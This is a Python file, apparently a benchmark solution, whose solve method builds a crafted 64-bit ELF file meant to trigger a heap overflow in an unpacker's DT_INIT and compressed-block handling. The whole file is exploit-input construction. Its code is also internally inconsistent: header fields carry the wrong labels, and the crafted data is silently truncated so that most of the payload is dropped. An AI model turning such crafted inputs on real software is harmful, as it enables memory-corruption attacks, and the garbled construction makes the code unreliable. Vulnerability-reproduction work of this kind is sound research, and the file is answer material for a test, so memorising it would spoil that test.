import os
import struct
import subprocess
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create an ELF shared library header with minimal valid structure
        # and carefully crafted values to trigger the heap buffer overflow
        
        # ELF header (64-bit)
        elf_header = bytearray([
            0x7f, 0x45, 0x4c, 0x46,  # ELF magic
            0x02,                    # 64-bit
            0x01,                    # Little endian
            0x01,                    # ELF version
            0x03,                    # Shared object
            0x00,                    # System V ABI
            0x00,                    # ABI version
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Padding
            0x02, 0x00,             # ET_EXEC
            0x3e, 0x00,             # x86-64
            0x01, 0x00, 0x00, 0x00,  # ELF version
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Entry point
            0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Program header offset
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Section header offset
            0x00, 0x00, 0x00, 0x00,  # Flags
            0x40, 0x00,             # ELF header size
            0x38, 0x00,             # Program header entry size
            0x02, 0x00,             # Number of program headers
            0x00, 0x00,             # Section header entry size
            0x00, 0x00,             # Number of section headers
            0x00, 0x00              # Section header string table index
        ])
        
        # Program header 1: PT_LOAD with DT_INIT
        phdr1 = bytearray([
            0x01, 0x00, 0x00, 0x00,  # PT_LOAD
            0x07, 0x00, 0x00, 0x00,  # RWX flags
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Offset
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Virtual address
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Physical address
            0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # File size (256)
            0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Memory size (256)
            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00   # Alignment
        ])
        
        # Program header 2: PT_DYNAMIC
        phdr2 = bytearray([
            0x02, 0x00, 0x00, 0x00,  # PT_DYNAMIC
            0x06, 0x00, 0x00, 0x00,  # RW flags
            0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Offset (256)
            0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Virtual address (256)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Physical address
            0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # File size (240)
            0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Memory size (240)
            0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00   # Alignment
        ])
        
        # Dynamic section entries
        dynamic = bytearray()
        
        # DT_INIT entry - triggers un_DT_INIT()
        dynamic += struct.pack("<QQ", 0x0c, 0x200)  # DT_INIT with offset 0x200
        
        # DT_STRTAB entry
        dynamic += struct.pack("<QQ", 0x05, 0x300)  # DT_STRTAB
        
        # DT_SYMTAB entry
        dynamic += struct.pack("<QQ", 0x06, 0x400)  # DT_SYMTAB
        
        # DT_HASH entry
        dynamic += struct.pack("<QQ", 0x04, 0x500)  # DT_HASH
        
        # DT_NULL terminator
        dynamic += struct.pack("<QQ", 0x00, 0x00)
        
        # Pad dynamic section to 240 bytes
        dynamic += b"\x00" * (240 - len(dynamic))
        
        # INIT section with carefully crafted values to trigger overflow
        # This section will be processed by un_DT_INIT()
        init_section = bytearray()
        
        # Create a compressed block header that will trigger the vulnerability
        # b_info structure: sz_unc, sz_cpr, b_method
        # We set b_method to trigger the improper resetting vulnerability
        for i in range(8):  # Multiple blocks to exploit the reset issue
            init_section += struct.pack("<III", 
                0x1000,      # sz_unc - large uncompressed size
                0x80,        # sz_cpr - compressed size
                i % 3        # b_method - cycle through methods to exploit reset bug
            )
            # Compressed data - crafted to cause heap overflow when decompressed
            init_section += b"A" * 0x80
        
        # Add more crafted data to trigger file_image[] not treated as ReadOnly
        # and fi->seek()+read() not subsumed issues
        init_section += struct.pack("<Q", 0x4141414141414141)  # ph.method pointer
        init_section += struct.pack("<Q", 0x4242424242424242)  # file_image pointer
        init_section += struct.pack("<Q", 0x4343434343434343)  # xct_off
        
        # Pad to create total size of exactly 512 bytes
        total_size = len(elf_header) + len(phdr1) + len(phdr2) + len(dynamic) + len(init_section)
        padding_needed = 512 - total_size
        
        if padding_needed > 0:
            init_section += b"P" * padding_needed
        elif padding_needed < 0:
            # Truncate init_section if too long
            init_section = init_section[:len(init_section) + padding_needed]
        
        # Combine all sections
        poc = elf_header + phdr1 + phdr2 + dynamic + init_section
        
        # Ensure exactly 512 bytes
        return bytes(poc[:512])